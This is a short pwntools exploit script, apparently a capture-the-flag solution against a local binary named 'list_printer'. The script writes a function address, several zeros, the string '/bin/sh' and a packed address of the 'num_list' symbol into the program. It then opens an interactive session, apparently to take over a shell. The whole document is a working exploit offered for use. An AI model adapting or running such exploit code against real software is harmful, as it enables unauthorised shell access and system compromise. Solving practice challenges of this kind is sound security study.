from pwn import *

BIN = './list_printer'
context.binary = BIN
p = process(BIN)
elf = ELF(BIN)

random_func = elf.symbols['_Z11random_funcmPKc']
p.sendline(str(random_func).encode())
for _ in range(3):
	p.sendline(b'0')

header = b'/bin/sh'
p.sendline(header)

p.recvuntil(b'characters):')
payload = pack(elf.symbols['num_list'])
p.sendline(payload)

print(p.recvline().decode().rstrip())
p.interactive()
